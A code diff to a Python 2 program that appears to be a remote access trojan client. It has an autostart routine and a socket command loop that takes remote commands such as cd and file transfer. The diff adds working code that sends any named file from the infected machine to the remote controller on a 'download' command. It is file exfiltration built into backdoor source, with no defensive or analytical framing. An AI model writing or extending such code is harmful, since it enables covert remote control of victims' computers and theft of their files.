@@ -111,8 +111,22 @@ def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
     else:
         return 'info', ''
 
-def upload():
-    pass
+def upload(sock, filename, end="[ENDOFMESSAGE]"):
+    if not os.path.exists(filename):
+        return 'fileExistsError'
+
+    sock.sendall(str(os.path.getsize(filename)))
+    if sock.recv(2) == 'ok':
+        with open(filename, 'rb') as _file:
+            while 1:
+                l = _file.readline()
+                if l:
+                    sock.sendall(l)
+                else:
+                    sock.sendall(end)
+                    break
+            return 'uploadDone'
+    return 'uploadError'
 
 def download(sock, filename, end="[ENDOFMESSAGE]"):
     recievedData = ''
@@ -276,6 +290,12 @@ def fromAutostart():
                                 stdoutput = download(s, filename)
                             except:
                                 stdoutput = 'uploadError'
+                        elif data.startswith('download '):
+                            try:
+                                filename = data.split(' ')[1]
+                                stdoutput = upload(s, filename)
+                            except:
+                                stdoutput = 'downloadError'
                         elif data.startswith("cd"):
                             try:
                                 os.chdir(data[3:])
